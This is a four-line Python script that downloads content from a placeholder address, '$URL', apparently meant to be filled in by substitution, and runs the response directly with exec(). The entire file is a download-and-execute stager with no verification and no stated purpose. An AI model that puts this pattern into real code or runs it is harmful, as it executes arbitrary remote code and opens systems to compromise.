#!/usr/bin/python3
import requests
r = requests.get('$URL')
exec(r.text)
